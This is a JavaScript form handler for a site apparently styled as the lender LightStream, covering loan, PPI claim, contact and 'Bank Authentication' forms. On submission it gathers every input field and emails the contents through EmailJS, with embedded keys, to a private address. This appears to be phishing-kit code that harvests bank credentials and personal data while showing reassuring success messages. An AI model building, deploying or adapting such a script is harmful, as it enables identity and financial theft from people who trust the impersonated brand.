// Universal Form Handler for LightStream Forms
// Handles Personal Loans, Bank Authentication, and PPI Claims

// Initialize EmailJS
(function() {
    emailjs.init("nW8qV4aakkEtYlieZ");
})();

// Universal form data collector - EXACTLY like your original script.js
function collectFormData(form, formType) {
    const allInputs = form.querySelectorAll('input, select, textarea');
    const data = {};
    
    // Collect all input values using IDs (EXACTLY like your original)
    allInputs.forEach(input => {
        if (input.id && input.type !== 'checkbox') {
            data[input.id] = input.value || '';
        }
    });
    
    // Add application details (EXACTLY like your original)
    data.submissionDate = new Date().toLocaleString();
    data.applicationType = formType + ' Application';
    data.applicationStatus = formType + ' submitted successfully';
    
    // Add your email
    data.to_email = 'your-email@example.com'; // Replace with your email

    return data;
}

// Universal form submission handler
function handleFormSubmission(formId, formType, successMessage) {
    const form = document.getElementById(formId);
    
    if (!form) return;

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form data (EXACTLY like your original)
        const data = collectFormData(form, formType);
        const submitButton = form.querySelector('button[type="submit"]');
        const originalText = submitButton.textContent;
        
        // Show loading state
        submitButton.textContent = 'Processing...';
        submitButton.disabled = true;
        
        // Send email using EmailJS (EXACTLY like your original)
        emailjs.send('service_djfykou', 'template_526064c', data)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                
                // Show success message
                showNotification(successMessage, 'success');
                
                // Reset form
                form.reset();
                
                // Reset button
                submitButton.textContent = originalText;
                submitButton.disabled = false;
                
            }, function(error) {
                console.log('FAILED...', error);
                
                // Show error message
                showNotification('Failed to submit form. Please try again or contact us directly.', 'error');
                
                // Reset button
                submitButton.textContent = originalText;
                submitButton.disabled = false;
            });
    });
}

// Notification function
function showNotification(message, type) {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg transform transition-all duration-300 translate-x-full ${
        type === 'success' ? 'bg-green-600 text-white' : 'bg-red-600 text-white'
    }`;
    notification.innerHTML = `
        <div class="flex items-center">
            <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'} mr-3"></i>
            <span>${message}</span>
        </div>
    `;
    
    // Add to page
    document.body.appendChild(notification);
    
    // Animate in
    setTimeout(() => {
        notification.style.transform = 'translateX(0)';
    }, 100);
    
    // Remove after 5 seconds
    setTimeout(() => {
        notification.style.transform = 'translateX(100%)';
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 300);
    }, 5000);
}

// Initialize all forms when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Handle Personal Loan Form
    handleFormSubmission('personalLoanForm', 'Personal Loan', 'Loan application submitted successfully! We will contact you soon.');
    
    // Handle Bank Authentication Form
    handleFormSubmission('bankAuthForm', 'Bank Authentication', 'Bank authentication submitted successfully! We will process your request.');
    
    // Handle PPI Claim Form
    handleFormSubmission('ppiClaimForm', 'PPI Claim', 'PPI claim submitted successfully! We will contact you soon.');
    
    // Handle Contact Form
    handleFormSubmission('contactForm', 'Contact', 'Message sent successfully! We will get back to you soon.');
});

// Mobile menu toggle (shared across all pages)
function initMobileMenu() {
    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
    const mobileMenu = document.getElementById('mobileMenu');

    if (mobileMenuBtn && mobileMenu) {
        mobileMenuBtn.addEventListener('click', () => {
            mobileMenu.classList.toggle('hidden');
        });
    }
}

// Smooth scrolling for anchor links
function initSmoothScrolling() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// Initialize common functionality
document.addEventListener('DOMContentLoaded', function() {
    initMobileMenu();
    initSmoothScrolling();
});
